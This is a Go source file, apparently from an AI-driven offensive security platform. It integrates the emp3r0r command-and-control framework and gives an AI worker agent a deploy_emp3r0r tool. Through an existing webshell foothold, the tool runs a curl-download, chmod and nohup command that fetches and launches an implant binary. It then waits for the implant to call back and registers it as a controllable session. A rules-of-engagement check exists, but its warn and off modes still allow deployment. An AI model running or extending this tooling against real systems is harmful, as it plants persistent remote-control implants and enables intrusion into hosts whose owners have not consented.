// emp3r0r.go 装配 emp3r0r cc sidecar 集成：cc 连接管理、agent 上线轮询落库、
// 启动恢复、worker 工具 deploy_emp3r0r。
//
// emp3r0r v5 的 operator API 是 HTTP+CBOR 绑定在 userspace WireGuard netstack
// 上，本平台经 session.CCClient（进程内 userspace WG peer）桥接，不链接
// emp3r0r 代码（GPL-3.0 规避）。凭据走 config emp3r0r 段（wg_* 与
// operator_session），源自 cc 端 wg_config.json provisioning。
//
// 诚实语义：轮询把新上线 agent 自动落库+注册进 Registry；下线 agent 诚实标
// dead，不伪造存活。deploy_emp3r0r 经已有立足点投递 agent 二进制并启动，
// RoE 校验与 tunnel_deploy 同级（roeCheckHost）。
package server

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"strings"
	"sync"
	"time"

	"github.com/Autumn-27/artex/agent"
	"github.com/Autumn-27/artex/config"
	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/session"
	"github.com/Autumn-27/artex/stage"
	actool "github.com/Autumn-27/norma/tool"
)

// emp3r0rRuntime 是 cc 桥接运行时：桥接客户端 + agent tag → 会话 id 索引
// + 轮询回收。client 为 nil 表示 enabled 但 WG 凭据/配置不可用（工具报诚实错误）。
type emp3r0rRuntime struct {
	cfg    config.Emp3r0r
	client *session.CCClient

	mu   sync.Mutex
	seen map[string]int64 // agent tag → session id
}

// initEmp3r0r 在 initSessions 之前调用（恢复 emp3r0r 会话需要桥接客户端）。
// enabled=false 或凭据不全时降级：runtime 置 nil，启动不受影响。
func (s *Server) initEmp3r0r() {
	cfg := config.Emp3r0rConfig()
	if !cfg.Enabled {
		return
	}
	rt := &emp3r0rRuntime{cfg: cfg, seen: map[string]int64{}}
	ccCfg := session.Emp3r0rConfig{
		Endpoint:     cfg.WGEndpoint,
		ServerKey:    cfg.WGServerPublicKey,
		ServerIP:     cfg.WGServerIP,
		OperatorIP:   cfg.WGOperatorIP,
		OperatorKey:  cfg.WGOperatorKey,
		OperatorPort: cfg.OperatorPort,
		SessionID:    cfg.OperatorSession,
	}
	client, err := session.NewCCClient(ccCfg)
	if err != nil {
		log.Printf("[emp3r0r] cc 客户端构造失败: %v", err)
	} else {
		rt.client = client
	}
	s.emp3r0r = rt
	go s.pollEmp3r0rAgents()
	log.Printf("[emp3r0r] 集成已启用（cc WG 端点 %s；agent 上线轮询 %s）",
		cfg.WGEndpoint, cfg.PollInterval())
}

// pollEmp3r0rAgents 周期拉 list_connected_agents，把新上线 agent 自动落库+注册，
// 下线 agent 诚实标 dead。cc 不可达时只在状态翻转处记日志（不刷错误）。
func (s *Server) pollEmp3r0rAgents() {
	rt := s.emp3r0r
	if rt == nil || rt.client == nil || s.ctx == nil {
		return
	}
	tick := time.NewTicker(rt.cfg.PollInterval())
	defer tick.Stop()
	failLogged := false
	for {
		select {
		case <-s.ctx.Done():
			return
		case <-tick.C:
		}
		ctx, cancel := context.WithTimeout(s.ctx, 15*time.Second)
		agents, err := rt.client.Agents(ctx)
		cancel()
		if err != nil {
			if !failLogged {
				log.Printf("[emp3r0r] agent 轮询失败: %v", err)
				failLogged = true
			}
			continue
		}
		if failLogged {
			log.Printf("[emp3r0r] agent 轮询恢复")
			failLogged = false
		}
		liveTags := map[string]bool{}
		for _, a := range agents {
			if a.Tag == "" {
				continue
			}
			liveTags[a.Tag] = true
			rt.mu.Lock()
			_, known := rt.seen[a.Tag]
			rt.mu.Unlock()
			if !known {
				s.registerEmp3r0rAgent(a, 0, 0)
			} else {
				s.reconcileEmp3r0rStatus(a.Tag)
			}
		}
		// 下线 tag → 标 dead + 注册表移除（诚实，不伪造存活）。
		rt.mu.Lock()
		stale := []string{}
		for tag := range rt.seen {
			if !liveTags[tag] {
				stale = append(stale, tag)
			}
		}
		rt.mu.Unlock()
		for _, tag := range stale {
			s.markEmp3r0rDead(tag)
		}
	}
}

// empHostLabel 是 agent 的展示主机：首选 IP，其次 hostname。
func empHostLabel(a session.CCAgent) string {
	if len(a.IPs) > 0 && a.IPs[0] != "" {
		return a.IPs[0]
	}
	if a.Hostname != "" {
		return a.Hostname
	}
	return a.Tag
}

// reconcileEmp3r0rStatus 校正已知 tag 的落库状态：agent 在线但行标 dead
// （如陈旧探活判死）→ 复活回 alive 并补回注册表。读库失败只记日志。
func (s *Server) reconcileEmp3r0rStatus(tag string) {
	s.emp3r0r.mu.Lock()
	id, ok := s.emp3r0r.seen[tag]
	s.emp3r0r.mu.Unlock()
	if !ok || s.sessStore == nil {
		return
	}
	ctx, cancel := context.WithTimeout(s.ctx, 5*time.Second)
	defer cancel()
	rec, err := s.sessStore.Get(ctx, id)
	if err != nil || rec == nil || rec.Status == db.SessionAlive {
		return
	}
	if s.emp3r0r.client == nil {
		return
	}
	// 复活先探活：agent 在 cc 列表但命令已不可达时仍保持 dead（诚实）。
	var sec session.Secret
	if err := json.Unmarshal(rec.Secret, &sec); err != nil {
		return
	}
	e, rerr := session.RestoreEmp3r0r(id, sec, s.emp3r0r.client)
	if rerr != nil {
		return
	}
	if terr := e.Test(ctx); terr != nil {
		log.Printf("[emp3r0r] agent %s 在 cc 在线但探活失败，保持 dead: %v", tag, terr)
		return
	}
	if err := s.sessStore.UpdateStatus(ctx, id, db.SessionAlive); err != nil {
		log.Printf("[emp3r0r] agent %s 复活落库失败: %v", tag, err)
		return
	}
	// 复查行仍存在且已 alive——并发删除/改写时不把幽灵会话补回注册表。
	fresh, ferr := s.sessStore.Get(ctx, id)
	if ferr != nil || fresh == nil || fresh.Status != db.SessionAlive {
		return
	}
	if s.sessReg != nil {
		if _, have := s.sessReg.Get(id); !have {
			s.sessReg.Add(e)
		}
	}
	log.Printf("[emp3r0r] agent %s 在线且探活通过但库内标 dead → 复活 session %d", tag, id)
}

// registerEmp3r0rAgent 把新上线 agent 落库（kind=emp3r0r）并注册进 Registry，
// 是唯一登记入口（后台轮询与 deploy_emp3r0r 共用）。rt.mu 覆盖 seen 检查、
// 既有行收养与 Create 全程——并发登记同一 tag 不会产生两条会话行。
// 返回 session id；失败返回 0（下一轮轮询/调用会再试）。
func (s *Server) registerEmp3r0rAgent(a session.CCAgent, taskID, intentID int64) int64 {
	if s.sessStore == nil || s.sessReg == nil || s.emp3r0r == nil || s.emp3r0r.client == nil {
		return 0
	}
	rt := s.emp3r0r
	rt.mu.Lock()
	defer rt.mu.Unlock()
	if id, ok := rt.seen[a.Tag]; ok {
		return id // 已登记（轮询或并发 deploy 抢先）
	}
	host := empHostLabel(a)
	e, err := session.NewEmp3r0r(a.Tag, host, rt.client)
	if err != nil {
		log.Printf("[emp3r0r] agent %s 会话构造失败: %v", a.Tag, err)
		return 0
	}
	// 收养既有行：initSessions 恢复与轮询竞态下 tag 可能已落库。
	if recs, lerr := s.sessStore.List(s.ctx, db.SessionAlive); lerr == nil {
		for _, rec := range recs {
			if rec.Kind != "emp3r0r" {
				continue
			}
			var sec session.Secret
			if err := json.Unmarshal(rec.Secret, &sec); err != nil || sec.AgentTag != a.Tag {
				continue
			}
			e.SetID(rec.ID)
			s.sessReg.Add(e)
			rt.seen[a.Tag] = rec.ID
			log.Printf("[emp3r0r] agent 上线收养既有会话：%s (%s) → session %d", a.Tag, host, rec.ID)
			return rec.ID
		}
	}
	secret, _ := json.Marshal(e.Secret())
	rec := &db.SessionRecord{
		Kind:            e.Kind(),
		URL:             e.Secret().URL,
		Secret:          secret,
		Status:          db.SessionAlive,
		CreatedByTask:   taskID,
		CreatedByIntent: intentID,
	}
	id, err := s.sessStore.Create(s.ctx, rec)
	if err != nil {
		log.Printf("[emp3r0r] agent %s 落库失败: %v", a.Tag, err)
		return 0
	}
	e.SetID(id)
	s.sessReg.Add(e)
	rt.seen[a.Tag] = id
	log.Printf("[emp3r0r] agent 上线：%s (%s, %s/%s, user=%s) → session %d",
		a.Tag, host, a.OS, a.GOOS, a.User, id)
	return id
}

// emp3r0rAgentOnHost 校验 agent 归属：回连 agent 应与部署落点同主机。
// 比对 hostname 与各接口 IP（大小写不敏感）；无匹配则不属于本次部署。
func emp3r0rAgentOnHost(a session.CCAgent, host string) bool {
	host = strings.ToLower(strings.TrimSpace(host))
	if host == "" {
		return false
	}
	if strings.ToLower(strings.TrimSpace(a.Hostname)) == host {
		return true
	}
	for _, ip := range a.IPs {
		if strings.ToLower(strings.TrimSpace(ip)) == host {
			return true
		}
	}
	return false
}

// markEmp3r0rDead 把下线 agent 的会话标 dead 并从注册表移除。
// UpdateStatus 失败时保留 seen 索引，下一轮重试（不写死状态丢痕）。
func (s *Server) markEmp3r0rDead(tag string) {
	if s.sessStore == nil {
		return
	}
	s.emp3r0r.mu.Lock()
	id, ok := s.emp3r0r.seen[tag]
	s.emp3r0r.mu.Unlock()
	if !ok {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := s.sessStore.UpdateStatus(ctx, id, db.SessionDead); err != nil {
		log.Printf("[emp3r0r] agent %s 标 dead 落库失败（下一轮重试）: %v", tag, err)
		return
	}
	s.emp3r0r.mu.Lock()
	delete(s.emp3r0r.seen, tag)
	s.emp3r0r.mu.Unlock()
	if s.sessReg != nil {
		s.sessReg.Remove(id)
	}
	log.Printf("[emp3r0r] agent 下线：%s（session %d 标 dead）", tag, id)
}

// emp3r0rTools 返回默认绑给 worker 的 emp3r0r 工具；未启用不提供。
func (s *Server) emp3r0rTools() []actool.CoreTool {
	if s.emp3r0r == nil {
		return nil
	}
	return []actool.CoreTool{
		s.deployEmp3r0rTool(),
	}
}

// deployEmp3r0rTool 经已有立足点把 agent 二进制投递到目标并启动，
// 等其回连 cc 后登记为 emp3r0r 会话。RoE 校验与 tunnel_deploy 同级
// （roeCheckHost：strict 拦截 / warn 告警放行 / off 放行）。
func (s *Server) deployEmp3r0rTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "deploy_emp3r0r",
		Description: "【emp3r0r·deploy】经已有立足点会话把 emp3r0r agent 二进制投递到目标并启动，" +
			"等其回连 cc 后登记为新会话，返回 session_id（kind=emp3r0r）。" +
			"投递经 stage 一次性 token 下载（目标 curl 拉取后即焚）。" +
			"部署目标经 RoE 授权范围校验（strict 拦截 / warn 放行留痕），与 tunnel_deploy 同级。" +
			"需要配置 emp3r0r.agent_binary（平台侧 agent 二进制路径）。" +
			"等回连超时返回明确原因，不伪造上线。",
		Schema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id":   map[string]any{"type": "integer", "description": "经哪条立足点会话投递（webshell）"},
				"drop_path":    strParam("目标侧落地路径（默认随机临时文件）"),
				"wait_seconds": map[string]any{"type": "integer", "description": "等 agent 回连上限秒数（默认配置值 120）"},
			},
			"required": []any{"session_id"},
		},
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			if s.emp3r0r == nil || s.emp3r0r.client == nil {
				return actool.Errorf("emp3r0r 集成未启用或 cc 客户端不可用"), nil
			}
			var a struct {
				SessionID   int64  `json:"session_id"`
				DropPath    string `json:"drop_path"`
				WaitSeconds int    `json:"wait_seconds"`
			}
			_ = json.Unmarshal(in, &a)
			via, err := s.lookupSession(a.SessionID)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			if s.emp3r0r.cfg.AgentBinary == "" {
				return actool.Errorf("emp3r0r.agent_binary 未配置（平台侧 agent 二进制路径）"), nil
			}
			// RoE：部署目标 = via 会话目标主机（同 tunnel_deploy 等级）。
			rec, rerr := s.sessStore.Get(ctx, a.SessionID)
			if rerr != nil || rec == nil || rec.Status != db.SessionAlive {
				return actool.Errorf("RoE scope check: session record unavailable; deployment denied"), nil
			}
			host := hostFromURL(rec.URL)
			if strings.TrimSpace(host) == "" {
				return actool.Errorf("RoE scope check: target host unknown; deployment denied"), nil
			}
			roeWarn, roeErr := s.roeCheckHost(ctx, host, "emp3r0r agent 部署目标")
			if roeErr != nil {
				return actool.Errorf(roeErr.Error()), nil
			}
			ri := agent.RunInfoFrom(ctx)
			entry, err := s.stage.PutFile(s.emp3r0r.cfg.AgentBinary, stage.PutOpts{
				OneShot: true,
				TaskID:  fmt.Sprintf("%d", ri.TaskID),
			})
			if err != nil {
				return actool.Errorf(withRoEWarn(roeWarn, "agent 暂存投递失败："+err.Error())), nil
			}
			// 部署前快照：回连归属判定基线。若先启动再读基线，后台轮询可能
			// 已登记本 agent（超时误报）；反过来其他新上线 agent 也不能归给本任务。
			baseline := map[string]bool{}
			preAgents, perr := s.emp3r0r.client.Agents(ctx)
			if perr != nil {
				return actool.Errorf(withRoEWarn(roeWarn, "部署前 cc 快照失败："+perr.Error())), nil
			}
			for _, ag := range preAgents {
				if ag.Tag != "" {
					baseline[ag.Tag] = true
				}
			}
			drop := strings.TrimSpace(a.DropPath)
			if drop == "" {
				drop = session.WorkerTmpPrefix(ri.TaskID, ri.IntentID) +
					fmt.Sprintf("%x", time.Now().UnixNano()%0xffffff)
			}
			sentinel := "ARTEX_EMP3R0R_" + fmt.Sprintf("%x", time.Now().UnixNano()%0xffffff)
			launch := fmt.Sprintf(
				"curl -fsSL %s -o %s && chmod +x %s && (nohup %s >/dev/null 2>&1 &); sleep 2; echo %s",
				shQ(entry.URL), shQ(drop), shQ(drop), shQ(drop), sentinel)
			out, _, err := via.Exec(ctx, launch, 60*time.Second)
			if err != nil {
				return actool.Errorf(withRoEWarn(roeWarn, "投递启动失败："+err.Error())), nil
			}
			if !strings.Contains(out, sentinel) {
				return actool.Errorf(withRoEWarn(roeWarn,
					"投递启动未确认（哨兵未回显；可能 curl 失败/agent 立即退出）。目标侧输出："+
						strings.TrimSpace(out))), nil
			}
			// 等回连：新增 tag + 主机归属（部署落点主机名/IP）双重校验后才认领。
			wait := s.emp3r0r.cfg.AgentWait()
			if a.WaitSeconds > 0 {
				wait = time.Duration(a.WaitSeconds) * time.Second
			}
			deadline := time.Now().Add(wait)
			for {
				if time.Now().After(deadline) {
					return actool.Errorf(withRoEWarn(roeWarn,
						fmt.Sprintf("agent 已启动但 %s 内未回连 cc（可能被目标拦截/agent 异常退出）", wait))), nil
				}
				agents, aerr := s.emp3r0r.client.Agents(ctx)
				if aerr != nil {
					return actool.Errorf(withRoEWarn(roeWarn, "cc 轮询失败："+aerr.Error())), nil
				}
				for _, ag := range agents {
					if ag.Tag == "" || baseline[ag.Tag] || !emp3r0rAgentOnHost(ag, host) {
						continue
					}
					// 统一登记入口：轮询并发先登记时收养其 id，不产生双行。
					id := s.registerEmp3r0rAgent(ag, ri.TaskID, ri.IntentID)
					if id == 0 {
						return actool.Errorf(withRoEWarn(roeWarn, "会话登记失败（详见日志）")), nil
					}
					res := map[string]any{
						"session_id": id,
						"kind":       "emp3r0r",
						"agent_tag":  ag.Tag,
						"host":       empHostLabel(ag),
						"os":         ag.OS,
						"user":       ag.User,
						"has_root":   ag.HasRoot,
						"note":       "agent 已回连并登记为 emp3r0r 会话；session_exec/session_read 等会话操作照常可用",
					}
					if roeWarn != "" {
						res["roe_warning"] = roeWarn
					}
					return jsonResult(res)
				}
				select {
				case <-ctx.Done():
					return actool.Errorf(withRoEWarn(roeWarn, "部署被取消")), nil
				case <-time.After(3 * time.Second):
				}
			}
		},
	})
}

func shQ(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// seedEmp3r0rTools 把 deploy_emp3r0r seed 进 tools 表、默认绑 worker。
func (s *Server) seedEmp3r0rTools() {
	if s.emp3r0r == nil || s.m == nil || s.m.PG() == nil {
		return
	}
	workerAgents, _ := json.Marshal([]string{"worker"})
	for _, t := range s.emp3r0rTools() {
		schema, _ := json.Marshal(t.InputSchema())
		if err := s.m.PG().SeedTool(t.Name(), t.Description(), schema, workerAgents); err != nil {
			log.Printf("[tools] seed %s 失败： %v", t.Name(), err)
		}
	}
}
